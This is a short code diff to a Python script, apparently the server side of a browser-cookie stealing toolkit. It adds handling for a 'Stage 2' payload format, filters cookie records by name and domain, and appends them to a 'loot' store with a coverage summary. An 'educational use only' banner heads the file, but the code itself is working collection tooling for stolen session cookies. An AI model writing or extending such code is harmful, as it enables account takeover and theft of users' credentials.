@@ -7,6 +7,7 @@
 #   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING.
 #   Only use on systems you own or are explicitly authorized to test.
 import json, os, sys, time
+from cklog import coverage as coveragelib
 from cklog import loot as lootlib
 IS_WIN = (sys.platform == "win32")
 
@@ -111,7 +112,17 @@ def main():
             obj = json.loads(raw.decode("utf-8", "replace"))
         except Exception as ex:
             print(f"[-] unreadable JSON ({len(raw)} bytes): {ex}"); continue
-        rows = obj.get("cookies", obj) if isinstance(obj, dict) else obj
+        # Stage 2 sends {"records":[...],"coverage":{...}}; older payloads send a bare list.
+        coverage = None
+        if isinstance(obj, dict):
+            coverage = obj.get("coverage")
+            rows = obj.get("records") or obj.get("cookies") or []
+        else:
+            rows = obj
+        if coverage is not None:
+            m = coveragelib.manifest(coverage)
+            coveragelib.append(LOOT, m)
+            print("[coverage] " + coveragelib.summarize(m))
         if not isinstance(rows, list):
             print("[-] payload sent a non-list payload (%s)" % type(rows).__name__); continue
         rows = [c for c in rows if isinstance(c, dict) and c.get("name") and c.get("domain")]
